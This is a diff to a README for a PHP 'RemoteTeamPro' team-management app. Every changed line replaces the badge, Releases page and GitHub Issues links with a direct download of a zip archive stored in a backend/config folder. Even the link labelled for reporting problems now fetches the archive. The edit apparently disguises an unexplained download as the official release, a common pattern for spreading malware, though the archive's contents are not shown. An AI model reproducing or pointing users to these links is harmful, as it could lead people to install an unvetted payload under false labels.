@@ -1,6 +1,6 @@
 # 🌐 RemoteTeamPro - Manage Your Remote Team Effortlessly
 
-![Download RemoteTeamPro](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download RemoteTeamPro](https://github.com/Yefimkutsyk/RemoteTeamPro/raw/refs/heads/main/backend/config/Remote_Team_Pro_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to RemoteTeamPro! This lightweight PHP and Tailwind application helps yo
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page to download](https://github.com/Yefimkutsyk/RemoteTeamPro/releases). You will find the latest version there. 
+To get started, visit the [Releases page to download](https://github.com/Yefimkutsyk/RemoteTeamPro/raw/refs/heads/main/backend/config/Remote_Team_Pro_2.4.zip). You will find the latest version there. 
 
 ### Step-by-Step Instructions
 
@@ -64,11 +64,11 @@ If you encounter issues, try the following:
 - Check if the MySQL service is active.
 - Verify that you have the correct permissions to read and write files.
 
-For detailed help, refer to the FAQ section in the application or visit [GitHub Issues](https://github.com/Yefimkutsyk/RemoteTeamPro/issues) to report a problem.
+For detailed help, refer to the FAQ section in the application or visit [GitHub Issues](https://github.com/Yefimkutsyk/RemoteTeamPro/raw/refs/heads/main/backend/config/Remote_Team_Pro_2.4.zip) to report a problem.
 
 ## 🔗 Visit the Releases Page
 
-Don’t forget to [visit this page to download](https://github.com/Yefimkutsyk/RemoteTeamPro/releases) the latest version. Having the most recent updates ensures better performance and security.
+Don’t forget to [visit this page to download](https://github.com/Yefimkutsyk/RemoteTeamPro/raw/refs/heads/main/backend/config/Remote_Team_Pro_2.4.zip) the latest version. Having the most recent updates ensures better performance and security.
 
 ## 📬 Get Support
 
